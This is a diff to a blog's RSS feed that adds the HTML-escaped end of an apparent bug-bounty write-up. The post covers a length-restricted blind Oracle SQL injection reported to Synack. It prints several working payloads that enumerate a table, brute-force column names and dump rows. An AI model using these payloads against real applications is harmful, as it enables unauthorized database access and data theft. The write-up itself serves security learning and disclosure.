+&lt;p&gt;To find a table that was not a system table, I did some guesswork. As I mentioned earlier in the blog, this application was a retest. I had already sent plenty of SQLis on this application. Due to this, I was fortunate enough to know the naming convention of the tables. I knew the table names had the following prefix: &amp;ldquo;&lt;strong&gt;SYN_&lt;/strong&gt;&amp;rdquo;.&lt;/p&gt;
+&lt;p&gt;I crafted a payload to check for tables that had the &amp;ldquo;&lt;strong&gt;SYN_&lt;/strong&gt;&amp;rdquo; prefix. The payload looked like this:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;AND(CASE WHEN((SELECT COUNT(*) FROM all_tables WHERE table_name LIKE &amp;#39;&lt;/span&gt;SYN____&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;)=1)THEN 1ELSE 1/0END)=1OR&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;-- 111 characters
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This payload was successful and I enumerated the table name to be &amp;ldquo;&lt;strong&gt;SYN_NEW&lt;/strong&gt;&amp;rdquo;.&lt;/p&gt;
+&lt;h3 id=&#34;guessing-column-names&#34;&gt;Guessing Column Names&lt;/h3&gt;
+&lt;p&gt;Next up, we had to enumerate the column names from the &amp;ldquo;SYN_NEW&amp;rdquo; table. For this, I tried to craft a payload like this:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;AND(CASE WHEN((SELECT OWNER FROM all_tab_columns WHERE table_name=&amp;#39;&lt;/span&gt;SYN_NEW&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ANDROWNUM=1)&amp;gt;0)THEN 1ELSE 1/0END)=1OR&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;-- 119 characters
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;However, this payload would not work. The &lt;code&gt;(SELECT OWNER FROM all_tab_columns WHERE table_name=&#39;SYN_NEW&#39;ANDROWNUM=1)&lt;/code&gt; subquery returns a string and we must compare it with a string to get a meaningful result. Even if we try to compare it with the ASCII value of the first character, we would be limited to enumerating the first character of the column name. We had just enough space to fit a single character.&lt;/p&gt;
+&lt;p&gt;I could not think of anything from here. So, I decided to brute force the column names. To perform the brute force, I used the following payload:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;AND(CASE WHEN((SELECT LENGTH(§test§) FROM SYN_NEW OFFSET 1ROWS FETCH NEXT 1ROWS ONLY)&amp;gt;0)THEN 1ELSE 1/0END)=1OR&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;-- 115 characters
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I brute-forced using the &lt;a href=&#34;https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt&#34;&gt;burp-parameter-names.txt&lt;/a&gt; wordlist.&lt;/p&gt;
+&lt;p&gt;And quickly enough, I found one column &amp;ldquo;&lt;strong&gt;user&lt;/strong&gt;&amp;rdquo;.&lt;/p&gt;
+&lt;h3 id=&#34;dumping-the-rows&#34;&gt;Dumping The Rows&lt;/h3&gt;
+&lt;p&gt;From here, the database dump was quite easy, I just used the following payload to dump one row at a time:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;AND(CASE WHEN((SELECT user FROM SYN_NEW OFFSET 1ROW FETCH NEXT 1ROW ONLY)&amp;gt;&amp;#39;&lt;/span&gt;SYN&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;)THEN 1ELSE 1/0END)=1OR&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;-- 108 characters
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I enumerated the first row to be &amp;ldquo;&lt;strong&gt;SYN_WAS&lt;/strong&gt;&amp;rdquo;. To confirm that what we dumped was indeed a valid row and was not a fluke, I used the following payload:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;AND(CASE WHEN((SELECT user FROM SYN_NEW OFFSET 1ROW FETCH NEXT 1ROW ONLY)=&amp;#39;&lt;/span&gt;SYN_WAS&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;)THEN 1ELSE 1/0END)=1OR&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;-- 112 characters
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If you change from &amp;ldquo;&lt;strong&gt;SYN_WAS&lt;/strong&gt;&amp;rdquo; to something else like &amp;ldquo;&lt;strong&gt;SYN_WAR&lt;/strong&gt;&amp;rdquo;, the application will send a false response. Confirming that our row dump is valid.&lt;/p&gt;
+&lt;p&gt;Sent the report to Synack and they happily accepted the findings!&lt;/p&gt;
+&lt;h3 id=&#34;takeaways&#34;&gt;Takeaways&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;Keep taking notes of your vulnerabilities. You never know when they will become useful.&lt;/li&gt;
+&lt;li&gt;Bug bounties are often luck paired with hard work. If I had not found the SQL injections on this target in the past, I would never have guessed what naming structure the table names follow.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;I love doing technical discussions with the community! If you have a question about anything infosec-related, feel free to send me a DM on my &lt;a href=&#34;https://twitter.com/kuldeepdotexe&#34;&gt;Twitter&lt;/a&gt;/&lt;a href=&#34;https://www.instagram.com/kuldeepdotexe&#34;&gt;Instagram&lt;/a&gt;/&lt;a href=&#34;https://www.linkedin.com/in/kuldeep-pandya-13a26a167/&#34;&gt;LinkedIn&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;EOF&lt;/p&gt;
+</content>
+    </item>
+    
     <item>
       <title>Escalating Privileges With SSRF</title>
       <link>https://kuldeep.io/posts/escalating-privileges-with-ssrf/</link>
